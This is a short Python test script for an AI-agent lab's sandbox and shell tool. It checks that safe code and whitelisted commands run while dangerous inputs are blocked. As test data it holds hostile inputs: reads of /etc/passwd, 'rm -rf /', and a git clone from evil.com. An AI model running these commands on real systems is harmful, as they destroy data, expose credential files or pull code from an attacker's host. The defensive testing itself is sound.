from agent_lab.app.services.sandbox import execute_sandboxed
from agent_lab.app.services.tools import run_shell_command

print("=== Test 1: 正常数学代码 ===")
print(execute_sandboxed("print(sum(range(10)))\nprint([x**2 for x in range(5)])"))

print()
print("=== Test 2: import os 应被拦截 ===")
print(execute_sandboxed("import os; print(os.listdir('/'))"))

print()
print("=== Test 3: open() 应被拦截 ===")
print(execute_sandboxed("open('/etc/passwd').read()"))

print()
print("=== Test 4: 命令替换注入应被拦截 ===")
print(execute_sandboxed("import subprocess; subprocess.run(['cat','/etc/passwd'])"))

print()
print("=== Test 5: 白名单 shell ls 命令 ===")
result = run_shell_command.invoke({"command": "ls /app"})
print(result[:300])

print()
print("=== Test 6: 危险 rm 命令被拦截 ===")
print(run_shell_command.invoke({"command": "rm -rf /"}))

print()
print("=== Test 7: git 只读子命令 ===")
print(run_shell_command.invoke({"command": "git --version"}))

print()
print("=== Test 8: 危险 git 子命令被拦截 ===")
print(run_shell_command.invoke({"command": "git clone http://evil.com/repo"}))
